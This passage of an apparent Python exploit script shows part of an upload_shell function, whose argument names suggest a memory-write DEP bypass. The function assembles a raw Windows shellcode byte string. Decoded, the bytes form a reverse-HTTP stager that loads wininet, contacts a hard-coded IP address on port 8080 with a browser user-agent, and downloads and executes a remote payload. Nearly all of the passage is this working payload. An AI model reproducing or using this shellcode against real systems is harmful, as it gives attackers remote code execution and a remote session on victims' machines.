...
def upload_shell(libeay32IBM019Func: int, WPMAddr: int, server: str, port: int):
    ...
    # Raw shell code.
    raw_shellcode = b""
    raw_shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2"
    raw_shellcode += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
    raw_shellcode += b"\x72\x28\x31\xff\x0f\xb7\x4a\x26\x31\xc0\xac"
    raw_shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    raw_shellcode += b"\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c"
    raw_shellcode += b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
    raw_shellcode += b"\x50\x8b\x58\x20\x8b\x48\x18\x01\xd3\x85\xc9"
    raw_shellcode += b"\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31"
    raw_shellcode += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
    raw_shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
    raw_shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
    raw_shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
    raw_shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
    raw_shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x6e\x65\x74"
    raw_shellcode += b"\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26"
    raw_shellcode += b"\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\xe8"
    raw_shellcode += b"\x75\x00\x00\x00\x4d\x6f\x7a\x69\x6c\x6c\x61"
    raw_shellcode += b"\x2f\x35\x2e\x30\x20\x28\x4d\x61\x63\x69\x6e"
    raw_shellcode += b"\x74\x6f\x73\x68\x3b\x20\x49\x6e\x74\x65\x6c"
    raw_shellcode += b"\x20\x4d\x61\x63\x20\x4f\x53\x20\x58\x20\x31"
    raw_shellcode += b"\x32\x5f\x30\x5f\x31\x29\x20\x41\x70\x70\x6c"
    raw_shellcode += b"\x65\x57\x65\x62\x4b\x69\x74\x2f\x36\x30\x35"
    raw_shellcode += b"\x2e\x31\x2e\x31\x35\x20\x28\x4b\x48\x54\x4d"
    raw_shellcode += b"\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63"
    raw_shellcode += b"\x6b\x6f\x29\x20\x56\x65\x72\x73\x69\x6f\x6e"
    raw_shellcode += b"\x2f\x31\x35\x2e\x30\x20\x53\x61\x66\x61\x72"
    raw_shellcode += b"\x69\x2f\x36\x30\x35\x2e\x31\x2e\x31\x35\x00"
    raw_shellcode += b"\x68\x3a\x56\x79\xa7\xff\xd5\x53\x53\x6a\x03"
    raw_shellcode += b"\x53\x53\x68\x90\x1f\x00\x00\xe8\xed\x00\x00"
    raw_shellcode += b"\x00\x2f\x49\x64\x63\x70\x4e\x66\x7a\x4a\x5a"
    raw_shellcode += b"\x58\x45\x6e\x5a\x79\x5a\x6d\x52\x70\x42\x32"
    raw_shellcode += b"\x51\x41\x42\x6b\x43\x47\x56\x64\x56\x55\x45"
    raw_shellcode += b"\x33\x63\x44\x39\x33\x79\x4e\x4a\x45\x36\x55"
    raw_shellcode += b"\x37\x6e\x75\x6d\x66\x4b\x76\x7a\x58\x57\x77"
    raw_shellcode += b"\x4f\x52\x33\x59\x44\x44\x5a\x69\x5f\x78\x31"
    raw_shellcode += b"\x76\x6f\x67\x6d\x4a\x73\x46\x42\x34\x6b\x67"
    raw_shellcode += b"\x54\x53\x73\x43\x36\x4c\x4a\x36\x4f\x63\x57"
    raw_shellcode += b"\x65\x6c\x5f\x4b\x47\x6d\x57\x5f\x7a\x33\x4b"
    raw_shellcode += b"\x72\x59\x6d\x33\x47\x56\x79\x69\x79\x54\x43"
    raw_shellcode += b"\x5a\x63\x68\x5f\x00\x50\x68\x57\x89\x9f\xc6"
    raw_shellcode += b"\xff\xd5\x89\xc6\x53\x68\x00\x02\x68\x84\x53"
    raw_shellcode += b"\x53\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b\xff"
    raw_shellcode += b"\xd5\x96\x6a\x0a\x5f\x53\x53\x53\x53\x56\x68"
    raw_shellcode += b"\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68"
    raw_shellcode += b"\x88\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5"
    raw_shellcode += b"\x4f\x75\xe1\xe8\x4b\x00\x00\x00\x6a\x40\x68"
    raw_shellcode += b"\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68"
    raw_shellcode += b"\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7"
    raw_shellcode += b"\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96"
    raw_shellcode += b"\x89\xe2\xff\xd5\x85\xc0\x74\xcf\x8b\x07\x01"
    raw_shellcode += b"\xc3\x85\xc0\x75\xe5\x58\xc3\x5f\xe8\x7f\xff"
    raw_shellcode += b"\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x34"
    raw_shellcode += b"\x39\x2e\x31\x38\x35\x00\xbb\xf0\xb5\xa2\x56"
    raw_shellcode += b"\x6a\x00\x53\xff\xd5"
